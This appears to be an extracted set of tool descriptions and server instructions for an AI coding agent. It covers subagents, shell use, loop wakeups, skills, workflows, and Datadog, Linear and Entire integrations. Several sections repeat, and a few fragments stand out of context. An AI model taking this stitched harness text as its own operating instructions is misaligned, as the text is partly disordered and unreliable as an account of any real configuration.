tools.name: Agent
tools.description:
Launch a new agent to handle complex, multi-step tasks. Each agent type has specific capabilities and tools available to it.

Available agent types are listed in <system-reminder> messages in the conversation.

When using the Agent tool, specify a subagent_type to select an agent: `"fork"` forks yourself (the fork inherits your full conversation context and always runs on your model — a `model` override is ignored); any other type — or omitting it — starts a fresh agent (general-purpose by default).

## When to use

A fresh agent costs more than it looks. It knows only what you put in the prompt, and you see only the summary it sends back — both handoffs drop detail, and neither of you can tell what the other missed. You can't watch it work, only wait or cancel. Its mistakes come back in the same confident register as its findings, and an agent handed your hypothesis tends to return it confirmed. Several at once spend tokens in a burst the user didn't ask for. Weigh those tokens against the accuracy they buy: the user pays for agents you did not need, and pays again for work you redo because you skipped one.

Reach for this when you have independent work to run in parallel, when the user asks for a side quest that shouldn't block your main thread, or when answering would mean reading across several files — delegate that and you keep the conclusion, not the file dumps.

Do the work yourself when it is a handful of tool calls or a lookup whose target you already know; don't delegate a check you could run inline. Delegate review only when you want a read that isn't anchored on yours — then give it the code, not your conclusion. Once you've delegated something, don't also run it yourself; wait for the result. When in doubt, don't spawn.

When you do spawn one, brief it like the peer it is: state the goal and what you have already ruled out, point it at the files and docs worth reading instead of retyping them, and keep the scope explicit and narrow. That brief is the only context it will have, so it is your first lever on every cost above — and if you cannot write a clear one, you do not understand the task well enough to hand it off.

A fork keeps its tool output out of your context. If you are the fork, execute directly — don't re-delegate.

- The agent's final report is not shown to the user — relay what matters.
- Use SendMessage with the agent's ID or name to continue a previously spawned agent with its context intact; a new Agent call starts fresh (except subagent_type: "fork", which inherits your context).
- Each agent type's model, reasoning effort, and tools come from its definition (`.claude/agents/*.md` frontmatter or SDK `agents`).
- `isolation: "worktree"` gives the agent its own git worktree (auto-cleaned if unchanged).
- Subagents run in the background by default; you'll be notified when one completes. Pass `run_in_background: false` only when your very next action depends on the result and nothing else could usefully happen while it runs — otherwise background it so the user can interject. Never fabricate or predict a pending agent's results — the notification is never something you write yourself; if the user asks before it arrives, say it's still running.

tools.name: Bash
tools.description:
Executes a bash command and returns its output.

- `cd` carries to the next call only in the main session, if the command succeeds and ends inside the working directories. Outside them the shell returns to the start folder; otherwise it stays where it was. Prefer absolute paths — `cd` in a compound command can trigger a permission prompt. Shell state (env vars, functions) does not persist; the shell is initialized from the user's profile.
- IMPORTANT: Avoid using this tool to run `cat`, `head`, `tail`, `sed`, `awk`, or `echo` commands, unless explicitly instructed or after you have verified that a dedicated tool cannot accomplish your task. Instead, use the appropriate dedicated tool as this will provide a much better experience for the user.
- Command output is displayed to you, not reliably to the user.
- `timeout` is in milliseconds: default 120000, max 600000 for a foreground command.
- `run_in_background` runs the command detached: it keeps running across turns and re-invokes you when it exits. With it, `timeout` is how long the command may run in the background (default 1800000, max 7200000); at that limit it is stopped and you are re-invoked. No `&` needed. Foreground `sleep` is blocked; use Monitor with an until-loop to wait on a condition.

# Git
- Interactive flags (`-i`, e.g. `git rebase -i`, `git add -i`) are not supported in this environment.
- Use the `gh` CLI for GitHub operations (PRs, issues, API).
- GitHub notifies the owner of any `@name` written in a PR, issue, or comment. Write a bare `@name` only for a real login you mean to notify. Put roles, placeholders, and code (`@human`, `@reviewer`, `@types/node`) in backticks or drop the `@`, even when copied from project files.
- Commit or push only when the user asks. If on the default branch, branch first.
- End git commit messages and PR bodies with the attribution lines given in the conversation's system-reminder, when one is present.

Clear, concise description of what this command does in active voice. Never use words like "complex" or "risk" in the description - just describe what it does.

Say what the command does in plain words: do not echo the command's text, its flags, or file paths - the user reads this description, often without seeing the command.

- git status → "Show working tree status"
- npm install → "Install package dependencies"

- find . -name "*.tmp" -exec rm {} \; → "Find and delete all .tmp files recursively"
- git reset --hard origin/main → "Discard all local changes and match remote main"
- curl -s url | jq '.data[]' → "Fetch JSON from URL and extract data array elements"

tools.name: ScheduleWakeup
tools.description:
Schedule when to resume work in /loop dynamic mode — the user invoked /loop without an interval, asking you to self-pace iterations of a specific task.

Do NOT schedule a short-interval wakeup to poll for background work you started — when harness-tracked work finishes, you are re-invoked automatically, so polling is wasted. Instead schedule a long fallback (1200s+) so the loop survives if the work hangs or never notifies. The exception is external work the harness cannot track (a CI run, a deploy, a remote queue) — there, pick a delay matched to how fast that state actually changes.

Pass the same /loop prompt back via `prompt` each turn so the next firing repeats the task. For an autonomous /loop (no user prompt), pass the literal sentinel `<<autonomous-loop-dynamic>>` as `prompt` instead — the runtime resolves it back to the autonomous-loop instructions at fire time. (There is a similar `<<autonomous-loop>>` sentinel for CronCreate-based autonomous loops; do not confuse the two — ScheduleWakeup always uses the `-dynamic` variant.) To end the loop, call this tool with `stop: true` (omit every other field) — the loop ends immediately and no further wakeups fire.

Set `noop: true` if nothing changed — you checked and there's nothing to report ("no change", "still waiting", "quiet hold"). Set `noop: false` if something happened worth keeping — you edited a file, posted a message, advanced state, or surfaced a finding. Consecutive `noop: true` ticks are collapsed in the user's terminal view and tracked as a streak, so long quiet holds stay legible to the user without scrolling. Omit `noop` when stopping (`stop: true`).

## Picking delaySeconds

This session's requests use a 1-hour Anthropic prompt-cache TTL, so effectively every allowed delay (the runtime clamps to [60, 3600]) wakes up with your conversation context still cached. There is no cache cliff inside that range to pace around, and scheduling extra wakeups just to keep the cache warm is pure waste — never do that. (If the session enters usage overage, later requests drop to the 5-minute TTL; don't try to track or preempt that — the guidance here stays the same.)

Match the delay to what you're actually waiting for:

- **Actively polling external state the harness can't notify you about** (a CI run, a deploy, a remote queue): pick the delay from how fast that state actually changes. A CI run that takes ~8 minutes deserves one ~480s check, not eight 60s ones.
- **The long fallback heartbeat** (something else — a Monitor, a task notification — is the primary wake signal): 1200s+, so quiet wakeups stay rare.
- **Idle ticks with no specific signal to watch**: default to **1200s–1800s** (20–30 min). The loop still checks back regularly, and the user can always interrupt if they need you sooner.

Don't think in cache windows — think about what you're actually waiting for.

## The reason field

One short sentence on what you chose and why. Goes to telemetry and is shown back to the user. "watching CI run" beats "waiting." The user reads this to understand what you're doing without having to predict your cadence in advance — make it specific.

tools.name: Skill
tools.description:
Invoke a skill.

A skill is a packaged set of instructions the user or project has set up for a particular kind of task (deploy steps, a review checklist, a repo-specific workflow). Available skills appear in a system-reminder listing with one-line descriptions. When the task at hand is one a listed skill covers, call this tool first — the skill's instructions load into the turn for you to follow in place of your default approach; some skills instead run in a subagent and return the finished result. A skill that runs in the background returns only the agent's name — its result arrives later as a task notification, so don't wait on it or invoke it again in the meantime. Users may also ask for one by name (`/<name>`, or "slash command"); that's a request to invoke it.

- `skill`: exact name from the listing, no leading slash. Plugin skills use `plugin:skill`. Directory-scoped skills are listed with a path prefix (`apps/web:deploy`); when both scoped and unscoped variants of a name exist, pick the one whose directory contains the files you're working on (most specific wins; unscoped otherwise).
- `args`: optional arguments to pass through.

Only names from the listing (or that the user typed explicitly) are valid. Built-in CLI commands (`/help`, `/clear`, …) aren't skills. If a `<command-name>` block is already present this turn, the skill is loaded — follow it directly rather than calling again.

tools.name: ToolSearch
tools.description:
Fetches full schema definitions for deferred tools so they can be called.

Deferred tools appear by name in <system-reminder> messages. Until fetched, only the name is known — there is no parameter schema, so the tool cannot be invoked. This tool takes a query, matches it against the deferred tool list, and returns the matched tools' complete JSONSchema definitions inside a <functions> block. Once a tool's schema appears in that result, it is callable exactly like any tool defined at the top of the prompt.

Result format: each matched tool appears as one <function>{"description": "...", "name": "...", "parameters": {...}}</function> line inside the <functions> block — the same encoding as the tool list at the top of this prompt.

Query forms:
- "select:Read,Edit,Grep" — fetch these exact tools by name
- "notebook jupyter" — keyword search, up to max_results best matches
- "+slack send" — require "slack" in the name, rank by remaining terms

tools.name: Workflow
tools.description:
Execute a workflow script that orchestrates multiple subagents deterministically. Workflows run in the background — this tool returns immediately with a task ID, and a <task-notification> arrives when the workflow completes. Use /workflows to watch live progress.

ONLY call this tool when the user has explicitly opted into multi-agent orchestration. Workflows can spawn dozens of agents and consume a large amount of tokens; the user must request that scale, not have it inferred. Explicit opt-in means one of:
- The user included the keyword "ultracode" in their prompt (you'll see a system-reminder confirming it).
- Ultracode is on for the session (a system-reminder confirms it) — see **Ultracode** in the workflow authoring reference.
- The user directly asked you to run a workflow or use multi-agent orchestration in their own words ("use a workflow", "run a workflow", "fan out agents", "orchestrate this with subagents"). The ask must be in the user's words — a task that would merely benefit from a workflow does not count.
- The user invoked a skill or slash command whose instructions tell you to call Workflow.
- The user asked you to run a specific named or saved workflow.

For any other task — even one that would clearly benefit from parallelism — do NOT call this tool. Use the Agent tool (if available) for individual subagents, or briefly describe what a multi-agent workflow could do and how much it would roughly cost, and ask the user whether to run it. Mention they can ask for one with "use a workflow" in a future message to skip the ask.

Every script must begin with `export const meta = {...}`: a PURE LITERAL (no variables, calls or interpolation) giving the workflow's `name`, a one-line `description` (shown in the permission dialog) and optionally `phases` — one `{ title, detail? }` per phase() call, titles matched exactly. Pass the script inline via `script` — do not Write it to a file first, and do not also set the tool's `name` input (that selects a saved workflow); it is plain JavaScript, not TypeScript.

The canonical multi-stage pattern — pipeline by default, each dimension verifies as soon as its review completes:
  export const meta = {
    name: 'review-changes',
    description: 'Review changed files across dimensions, verify each finding',
    phases: [{ title: 'Review' }, { title: 'Verify' }],
  }
  const DIMENSIONS = [{key: 'bugs', prompt: '...'}, {key: 'perf', prompt: '...'}]
  const results = await pipeline(
    DIMENSIONS,
    d => agent(d.prompt, {label: `review:${d.key}`, phase: 'Review', schema: FINDINGS_SCHEMA}),
    review => parallel(review.findings.map(f => () =>
      agent(`Adversarially verify: ${f.title}`, {label: `verify:${f.file}`, phase: 'Verify', schema: VERDICT_SCHEMA})
        .then(v => ({...f, verdict: v}))
    ))
  )
  const confirmed = results.flat().filter(Boolean).filter(f => f.verdict?.isReal)
  return { confirmed }
  // Dimension 'bugs' findings verify while dimension 'perf' is still reviewing. No wasted wall-clock.

Before writing a script, load the `workflow-authoring` skill — the workflow authoring reference: script API and gotchas, resume, the **Ultracode** section, quality patterns, worked examples.

This session has the default workflow size guideline: medium — keep workflows under 10 agents. This is a guideline, not a hard limit — follow it unless the user's prompt calls for a different scale. The user can raise or remove it with "Dynamic workflow size" in /config.

script.description: Self-contained workflow script. Must begin with `export const meta = { name, description, phases }` (pure literal, no computed values) followed by the script body using agent()/parallel()/pipeline()/phase().

name.description: Name of a predefined workflow (built-in or from .claude/workflows/). Resolves to a self-contained script.

title.description: Ignored — set the workflow title in the script's `meta` block.

args.description: Optional input value exposed to the script as the global `args`, verbatim. Pass arrays/objects as actual JSON values, NOT as a JSON-encoded string — a stringified list breaks `args.filter`/`args.map` in the script. Use for parameterized named workflows (e.g. a research question).

scriptPath.description: Path to a workflow script file on disk. Every Workflow invocation persists its script under the session directory and returns the path in the tool result. resumeFromRunId.description: Run ID of a prior Workflow invocation to resume from. Completed agent() calls with unchanged (prompt, opts) return their cached results instantly; only edited or new calls re-run. Same-session only. Stop the prior run first (TaskStop) before resuming.

From a certified-query tool, org_disabled means certified queries are off for this organization: do not mention them or offer to certify or set up, and say they are off only if a person asks. When it is someone else's, say that its sharer must share the change, or that they can take the connector over on the artifact's page, which ends its sharer's share, and every viewer then gets results run with the person's own access. ## claude.ai Claude Docs
Claude Docs: living docs you create and edit here. A docs skill your client lists → load it before any docs call — also before a `read`, comment or tab change on a claude.ai …/artifact/… link (the link is a doc; never web-fetch it). No docs skill or guide text loaded → `guide( items = ["topic.index"] )` alone before any docs call but a doc's birth. Make a doc here — not a local file, even when coding — only when the user asks for one, and make it FIRST: the turn's first tool call is its skeleton (title, byline, a `pending` block per section) — a reflex: send it before any search, file read, plan, `guide` or thinking it through; think once it is open — `batch( container = {"kind":"project","create":{"name":"<title>","doc":{"blocks":{"asof":{"type":"date","value":"<today>"},"me":{"type":"mention","user":"me"},"s1":{"type":"pending","intent":"Goals: the three outcomes this quarter commits to"},"s2":{…}},"markdown":"# <title>

<?claude block asof?> · <?claude block me?>

<?claude block s1?>

<?claude block s2?>"}}}, batch = [] )` (`<?claude block k?>` ↔ `blocks.k`); its ack links the doc → `open` it with your Artifact tool (none → start your next message with the link, once); they're likely watching it fill — keep them posted in a short line naming what you're on (outline up; now <topic>); findings go in the doc, not chat; then `guide( items = ["topic.index"] )`, research, and fill each section: `replace` its pending id with `## <heading>` + body; end with one line + the link, never the document. Summoned by a doc comment (turn headed `[Artifact comment sent to Claude]`, `;thread=<root id>`): answer ONLY with a doc comment under that root (`create` an utterance, parent `<root id>`) — no artifact/platform comment tool: that relay thread is resolved and never reaches the doc; an edit asked there → `update` with `answering: "<root id>"`.

## claude.ai Datadog
This is an MCP server for Datadog (a software observability platform). See Datadog docs if you're unsure about how something works in the platform. Docs for this MCP server can be found at https://docs.datadoghq.com/bits_ai/mcp_server/setup/ When `execute_code` is available, use it to read Datadog data, even for a single lookup: one script can make several API calls, join data across products, and return only what the answer needs. Skill guides still apply for domain knowledge (query syntax, attribute and metric names, pitfalls), but where a guide tells you to call a specific read tool such as `search_datadog_logs`, `analyze_datadog_logs`, or `get_datadog_metric`, make the equivalent call from `execute_code` instead, using `search_datadog_sdk` to find it. This takes precedence over tool choices in skill guides. Use the named tool only when `search_datadog_sdk` finds no operation for what you need, or when `execute_code` still fails for a step after following its own error guidance. This server ships skill guides containing domain-specific guidance, workflows, and best practices that are not visible in tool names or schemas. Before invoking other tools, always perform skill discovery by running both paths in parallel: a direct load with `load_datadog_skill` using a general domain name (e.g. skill_name='datadog/traces'), and a call to `list_datadog_skills` with a fuzzy `query` based on topic keywords — load any clearly matching result from the listing along with the related skills it points to. The exception is a follow-up call in a domain whose skill you have already loaded or confirmed absent this session. If nothing clearly fits, do not load a skill — proceed with the tool descriptions. When the user asks to visualize, chart, or graph data — or when loading a data domain skill (e.g. datadog/traces, datadog/logs, datadog/metrics) — also load datadog/visualizations. Investigation results often benefit from charts.

## claude.ai entire-prod-us
Entire MCP — an investigation surface over Entire's engineering data: repos and their analytics, git history (commits, files, trees, refs, diffs), the AI checkpoints and sessions behind the code (with transcripts and token accounting), trails (PR-like change proposals), and code search. Reads are curated `*_entire` tools; a small write/ops group covers trail/review/runner/dispatch mutations.

Workflow: when you only have a repo name, path, or URL, call resolve_entire_repo first, then pass the repo it returns to repo-scoped tools. Prefer the aggregation tools (get_entire_repo_overview, get_entire_my_activity) over hand-rolling stats from raw listings.

Querying conventions (shared by every tool):
- Addressing: name a repo by a prefixed path (gh/<owner>/<repo>, et/<project>/<repo>, git/<owner>/<repo>) or a repo ULID. Repo ULIDs are REGION-SCOPED — the same repo has a different ULID per region, so never carry a ULID across regions or sessions; if a tool rejects one, re-resolve with resolve_entire_repo.
- Pagination: every list takes an opaque cursor and returns next_cursor when more remains — exhaust the pages before concluding "that's all".
- Time: since/until are ISO 8601 / RFC3339 bounds; where offered, timeframe is a relative window (last-month, last-3-months, last-6-months).
- Size: reads that can be large (files, diffs, transcripts) honor max_tokens and return next_cursor to continue — raise max_tokens or page rather than assuming truncation is the whole story.

Pitfalls:
- sessions[].tokenUsage on a checkpoint is a PER-CHECKPOINT delta, not a session total — sum across a session's checkpoints, or use get_entire_session for the authoritative total.
- list_entire_checkpoints silently truncates older history; for a branch's COMPLETE checkpoint membership, paginate list_entire_commits and collect the per-commit checkpoint IDs.

Skills: before deep work in a domain, load the matching skill (list_entire_skills / load_entire_skill) — entire/checkpoints-and-sessions and entire/token-analysis before token accounting, entire/trails before trail work, entire/querying for the full querying reference. Load them proactively, at the start of the work, not after an error.

Feedback: if a tool is wrong, misleading, or missing something, call send_entire_feedback (name the tool). Code search is gated per jurisdiction — where the index is not deployed, those tools say so.

# Tools

exec – run any PostHog command; its `command` description has the syntax.

Prioritize skills over tools.

## linear
When passing string values to tools, send the content directly without escape sequences. For example, use real newlines in markdown content rather than literal backslash-n (\n) characters.

Tools accept human-readable references, so you rarely need to look up IDs first: issue identifiers such as LIN-123, project identifiers such as P-ENG-12, team names or keys, user names or emails, and "me" for the authenticated user. Only call list_teams, list_users, or similar tools when a reference is ambiguous or unknown.

Use list_issues for structured queries, such as the issues assigned to "me" in a team, status, label, project, or cycle, and its query parameter for keyword search. Results are paginated: when hasNextPage is true, pass the returned cursor to fetch the next page rather than assuming the first page is complete.

Statuses and labels belong to teams and differ between them. When you are not sure which values a team supports, call list_issue_statuses or list_issue_labels for that team before filtering or setting them.

get_issue does not include the issue's discussion. Call list_comments with the issue ID to read comments, including inline comments on the description.

Issue descriptions, comments, and documents often embed screenshots and other uploads as markdown images. Pass that markdown to extract_images to view them. Read issue attachments with get_attachment; files uploaded in comments are returned in the attachments field of list_comments. Linear upload URLs are signed and expire after a few minutes, so fetch them again instead of reusing old URLs.

Tools named save_* both create and update: omit id to create a new entity, or pass id to update an existing one. When updating, pass only the fields you want to change. To edit part of a long issue description or document, pass patch instead of resending the full content.

Before creating an issue, check with list_issues whether a matching issue already exists, to avoid duplicates. When creating, team is required.

The labels parameter of save_issue replaces the issue's full label set. To add or remove individual labels without dropping others, use addLabels and removeLabels instead.

Markdown content supports user mentions with @displayName (for example @johndoe). To embed an image or file, upload it with prepare_file_upload and insert the markdown it returns; do not inline base64 data.

Write issue descriptions for people to read. Keep sentences short, and use the same term for the same concept throughout.

Put extensive agent-specific detail, such as implementation plans, file lists, or reproduction logs, in a collapsible "Agent notes" section at the end of the description, so it does not crowd the human-readable part. A collapsible section opens with +++ followed by its title, and closes with +++ on its own line:

+++ Agent notes

Details for agents go here.

+++

## When to use

A fresh agent costs more than it looks. It knows only what you put in the prompt, and you see only the summary it sends back — both handoffs drop detail, and neither of you can tell what the other missed. You can't watch it work, only wait or cancel. Its mistakes come back in the same confident register as its findings, and an agent handed your hypothesis tends to return it confirmed. Several at once spend tokens in a burst the user didn't ask for. Weigh those tokens against the accuracy they buy: the user pays for agents you did not need, and pays again for work you redo because you skipped one.

Reach for this when you have independent work to run in parallel, when the user asks for a side quest that shouldn't block your main thread, or when answering would mean reading across several files — delegate that and you keep the conclusion, not the file dumps.

Do the work yourself when it is a handful of tool calls or a lookup whose target you already know; don't delegate a check you could run inline. Delegate review only when you want a read that isn't anchored on yours — then give it the code, not your conclusion. Once you've delegated something, don't also run it yourself; wait for the result. When in doubt, don't spawn.

When you do spawn one, brief it like the peer it is: state the goal and what you have already ruled out, point it at the files and docs worth reading instead of retyping them, and keep the scope explicit and narrow. That brief is the only context it will have, so it is your first lever on every cost above — and if you cannot write a clear one, you do not understand the task well enough to hand it off.

A fork keeps its tool output out of your context. If you are the fork, execute directly — don't re-delegate.

- Use SendMessage with the agent's ID or name to continue a previously spawned agent with its context intact; a new Agent call starts fresh (except subagent_type: "fork", which inherits your context).

Omit `noop` when stopping (`stop: true`).

## Picking delaySeconds

This session's requests use a 1-hour Anthropic prompt-cache TTL, so effectively every allowed delay (the runtime clamps to [60, 3600]) wakes up with your conversation context still cached. There is no cache cliff inside that range to pace around, and scheduling extra wakeups just to keep the cache warm is pure waste — never do that. (If the session enters usage overage, later requests drop to the 5-minute TTL; don't try to track or preempt that — the guidance here stays the same.)

Match the delay to what you're actually waiting for:

- **Actively polling external state the harness can't notify you about** (a CI run, a deploy, a remote queue): pick the delay from how fast that state actually changes. A CI run that takes ~8 minutes deserves one ~480s check, not eight 60s ones.
- **The long fallback heartbeat** (something else — a Monitor, a task notification — is the primary wake signal): 1200s+, so quiet wakeups stay rare.
- **Idle ticks with no specific signal to watch**: default to **1200s–1800s** (20–30 min). The loop still checks back regularly, and the user can always interrupt if they need you sooner.

Don't think in cache windows — think about what you're actually waiting for.

## The reason field

One short sentence on what you chose and why. Goes to telemetry and is shown back to the user. "watching CI run" beats "waiting." The user reads this to understand what you're doing without having to predict your cadence in advance — make it specific.

delaySeconds.description: Seconds from now to wake up. Clamped to [60, 3600] by the runtime. Required unless `stop` is true.

reason.description: One short sentence explaining the chosen delay. Goes to telemetry and is shown to the user. Be specific. Required unless `stop` is true.

prompt.description: The /loop input to fire on wake-up. Pass the same /loop input verbatim each turn so the next firing re-enters the skill and continues the loop. For autonomous /loop (no user prompt), pass the literal sentinel `<<autonomous-loop-dynamic>>` instead (the dynamic-pacing variant, not the CronCreate-mode `<<autonomous-loop>>`). Required unless `stop` is true.

stop.description: Set to true to end the dynamic loop immediately instead of scheduling another wakeup. When true, all other fields are ignored and no further wakeups fire.

noop.description: true = nothing changed (you checked and there is nothing to report). false = something happened worth keeping (edited a file, posted a message, advanced state, surfaced a finding). Consecutive noop:true ticks are collapsed in the user's terminal view and tracked as a streak. Required unless `stop` is true.

Upload the ONBOARDING.md in the current directory and return a share link teammates can open in Claude Code. Call this after the user has confirmed the final content.

When called with the default mode='check': if a local ONBOARDING.md is present, uploads it to the most-recently-updated org guide (or creates one if none exist) and returns a fresh link. If no local file is present, returns the existing link without uploading (status: has_existing).

tools.name: Skill
tools.description:
Invoke a skill.

A skill is a packaged set of instructions the user or project has set up for a particular kind of task (deploy steps, a review checklist, a repo-specific workflow). Available skills appear in a system-reminder listing with one-line descriptions. When the task at hand is one a listed skill covers, call this tool first — the skill's instructions load into the turn for you to follow in place of your default approach; some skills instead run in a subagent and return the finished result. A skill that runs in the background returns only the agent's name — its result arrives later as a task notification, so don't wait on it or invoke it again in the meantime. Users may also ask for one by name (`/<name>`, or "slash command"); that's a request to invoke it.

- `skill`: exact name from the listing, no leading slash. Plugin skills use `plugin:skill`. Directory-scoped skills are listed with a path prefix (`apps/web:deploy`); when both scoped and unscoped variants of a name exist, pick the one whose directory contains the files you're working on (most specific wins; unscoped otherwise).
- `args`: optional arguments to pass through.

Only names from the listing (or that the user typed explicitly) are valid. Built-in CLI commands (`/help`, `/clear`, …) aren't skills. If a `<command-name>` block is already present this turn, the skill is loaded — follow it directly rather than calling again.

skill.description: The name of a skill from the available-skills list. Do not guess names.

tools.name: ToolSearch
tools.description:
Fetches full schema definitions for deferred tools so they can be called.

Deferred tools appear by name in <system-reminder> messages. Until fetched, only the name is known — there is no parameter schema, so the tool cannot be invoked. This tool takes a query, matches it against the deferred tool list, and returns the matched tools' complete JSONSchema definitions inside a <functions> block. Once a tool's schema appears in that result, it is callable exactly like any tool defined at the top of the prompt.

Result format: each matched tool appears as one <function>{"description": "...", "name": "...", "parameters": {...}}</function> line inside the <functions> block — the same encoding as the tool list at the top of this prompt.

Query forms:
- "select:Read,Edit,Grep" — fetch these exact tools by name
- "notebook jupyter" — keyword search, up to max_results best matches
- "+slack send" — require "slack" in the name, rank by remaining terms

query.description: Query to find deferred tools. Use "select:<tool_name>" for direct selection, or keywords to search.

max_results.description: Maximum number of results to return (default: 5)

tools.name: Workflow
tools.description:
Execute a workflow script that orchestrates multiple subagents deterministically. Workflows run in the background — this tool returns immediately with a task ID, and a <task-notification> arrives when the workflow completes. Use /workflows to watch live progress.

ONLY call this tool when the user has explicitly opted into multi-agent orchestration. Workflows can spawn dozens of agents and consume a large amount of tokens; the user must request that scale, not have it inferred. Explicit opt-in means one of:
- The user included the keyword "ultracode" in their prompt (you'll see a system-reminder confirming it).
- Ultracode is on for the session (a system-reminder confirms it) — see **Ultracode** in the workflow authoring reference.
- The user directly asked you to run a workflow or use multi-agent orchestration in their own words ("use a workflow", "run a workflow", "fan out agents", "orchestrate this with subagents"). The ask must be in the user's words — a task that would merely benefit from a workflow does not count.
- The user invoked a skill or slash command whose instructions tell you to call Workflow.
- The user asked you to run a specific named or saved workflow.

For any other task — even one that would clearly benefit from parallelism — do NOT call this tool. Use the Agent tool (if available) for individual subagents, or briefly describe what a multi-agent workflow could do and how much it would roughly cost, and ask the user whether to run it. Mention they can ask for one with "use a workflow" in a future message to skip the ask.

Every script must begin with `export const meta = {...}`: a PURE LITERAL (no variables, calls or interpolation) giving the workflow's `name`, a one-line `description` (shown in the permission dialog) and optionally `phases` — one `{ title, detail? }` per phase() call, titles matched exactly. Pass the script inline via `script` — do not Write it to a file first, and do not also set the tool's `name` input (that selects a saved workflow); it is plain JavaScript, not TypeScript.

The canonical multi-stage pattern — pipeline by default, each dimension verifies as soon as its review completes:
  export const meta = {
    name: 'review-changes',
    description: 'Review changed files across dimensions, verify each finding',
    phases: [{ title: 'Review' }, { title: 'Verify' }],
  }
  const DIMENSIONS = [{key: 'bugs', prompt: '...'}, {key: 'perf', prompt: '...'}]
  const results = await pipeline(
    DIMENSIONS,
    d => agent(d.prompt, {label: `review:${d.key}`, phase: 'Review', schema: FINDINGS_SCHEMA}),
    review => parallel(review.findings.map(f => () =>
      agent(`Adversarially verify: ${f.title}`, {label: `verify:${f.file}`, phase: 'Verify', schema: VERDICT_SCHEMA})
        .then(v => ({...f, verdict: v}))
    ))
  )
  const confirmed = results.flat().filter(Boolean).filter(f => f.verdict?.isReal)
  return { confirmed }
  // Dimension 'bugs' findings verify while dimension 'perf' is still reviewing. No wasted wall-clock.

Before writing a script, load the `workflow-authoring` skill — the workflow authoring reference: script API and gotchas, resume, the **Ultracode** section, quality patterns, worked examples.

This session has the default workflow size guideline: medium — keep workflows under 10 agents. This is a guideline, not a hard limit — follow it unless the user's prompt calls for a different scale. The user can raise or remove it with "Dynamic workflow size" in /config.

script.description: Self-contained workflow script. Must begin with `export const meta = { name, description, phases }` (pure literal, no computed values) followed by the script body using agent()/parallel()/pipeline()/phase().

name.description: Name of a predefined workflow (built-in or from .claude/workflows/). Resolves to a self-contained script.

description.description: Ignored — set the workflow description in the script's `meta` block.

title.description: Ignored — set the workflow title in the script's `meta` block.

args.description: Optional input value exposed to the script as the global `args`, verbatim. Pass arrays/objects as actual JSON values, NOT as a JSON-encoded string — a stringified list breaks `args.filter`/`args.map` in the script. Use for parameterized named workflows (e.g. a research question).

scriptPath.description: Path to a workflow script file on disk. Every Workflow invocation persists its script under the session directory and returns the path in the tool result. To iterate, edit that file with Write/Edit and re-invoke Workflow with the same `scriptPath` instead of re-sending the full script. Takes precedence over `script` and `name`.

resumeFromRunId.description: Run ID of a prior Workflow invocation to resume from. Completed agent() calls with unchanged (prompt, opts) return their cached results instantly; only edited or new calls re-run. Same-session only. Stop the prior run first (TaskStop) before resuming.

## claude.ai Claude Docs
Claude Docs: living docs you create and edit here. A docs skill your client lists → load it before any docs call — also before a `read`, comment or tab change on a claude.ai …/artifact/… link (the link is a doc; never web-fetch it). No docs skill or guide text loaded → `guide( items = ["topic.index"] )` alone before any docs call but a doc's birth. Make a doc here — not a local file, even when coding — only when the user asks for one, and make it FIRST: the turn's first tool call is its skeleton (title, byline, a `pending` block per section) — a reflex: send it before any search, file read, plan, `guide` or thinking it through; think once it is open — `batch( container = {"kind":"project","create":{"name":"<title>","doc":{"blocks":{"asof":{"type":"date","value":"<today>"},"me":{"type":"mention","user":"me"},"s1":{"type":"pending","intent":"Goals: the three outcomes this quarter commits to"},"s2":{…}},"markdown":"# <title>\n\n<?claude block asof?> · <?claude block me?>\n\n<?claude block s1?>\n\n<?claude block s2?>"}}}, batch = [] )` (`<?claude block k?>` ↔ `blocks.k`); its ack links the doc → `open` it with your Artifact tool (none → start your next message with the link, once); they're likely watching it fill — keep them posted in a short line naming what you're on (outline up; now <topic>); findings go in the doc, not chat; then `guide( items = ["topic.index"] )`, research, and fill each section: `replace` its pending id with `## <heading>` + body; end with one line + the link, never the document. ## claude.ai entire-prod-us
Entire MCP — an investigation surface over Entire's engineering data: repos and their analytics, git history (commits, files, trees, refs, diffs), the AI checkpoints and sessions behind the code (with transcripts and token accounting), trails (PR-like change proposals), and code search. Reads are curated `*_entire` tools; a small write/ops group covers trail/review/runner/dispatch mutations.

Workflow: when you only have a repo name, path, or URL, call resolve_entire_repo first, then pass the repo it returns to repo-scoped tools. Prefer the aggregation tools (get_entire_repo_overview, get_entire_my_activity) over hand-rolling stats from raw listings.

Querying conventions (shared by every tool):
- Addressing: name a repo by a prefixed path (gh/<owner>/<repo>, et/<project>/<repo>, git/<owner>/<repo>) or a repo ULID. Repo ULIDs are REGION-SCOPED — the same repo has a different ULID per region, so never carry a ULID across regions or sessions; if a tool rejects one, re-resolve with resolve_entire_repo.
- Pagination: every list takes an opaque cursor and returns next_cursor when more remains — exhaust the pages before concluding "that's all".
- Time: since/until are ISO 8601 / RFC3339 bounds; where offered, timeframe is a relative window (last-month, last-3-months, last-6-months).
- Size: reads that can be large (files, diffs, transcripts) honor max_tokens and return next_cursor to continue — raise max_tokens or page rather than assuming truncation is the whole story.

Pitfalls:
- sessions[].tokenUsage on a checkpoint is a PER-CHECKPOINT delta, not a session total — sum across a session's checkpoints, or use get_entire_session for the authoritative total.
- list_entire_checkpoints silently truncates older history; for a branch's COMPLETE checkpoint membership, paginate list_entire_commits and collect the per-commit checkpoint IDs.

Skills: before deep work in a domain, load the matching skill (list_entire_skills / load_entire_skill) — entire/checkpoints-and-sessions and entire/token-analysis before token accounting, entire/trails before trail work, entire/querying for the full querying reference. Load them proactively, at the start of the work, not after an error.

Feedback: if a tool is wrong, misleading, or missing something, call send_entire_feedback (name the tool). Code search is gated per jurisdiction — where the index is not deployed, those tools say so.

## linear
When passing string values to tools, send the content directly without escape sequences. For example, use real newlines in markdown content rather than literal backslash-n (\n) characters.

Tools accept human-readable references, so you rarely need to look up IDs first: issue identifiers such as LIN-123, project identifiers such as P-ENG-12, team names or keys, user names or emails, and "me" for the authenticated user. Only call list_teams, list_users, or similar tools when a reference is ambiguous or unknown.

Use list_issues for structured queries, such as the issues assigned to "me" in a team, status, label, project, or cycle, and its query parameter for keyword search. Results are paginated: when hasNextPage is true, pass the returned cursor to fetch the next page rather than assuming the first page is complete.

Statuses and labels belong to teams and differ between them. When you are not sure which values a team supports, call list_issue_statuses or list_issue_labels for that team before filtering or setting them.

get_issue does not include the issue's discussion. Call list_comments with the issue ID to read comments, including inline comments on the description.

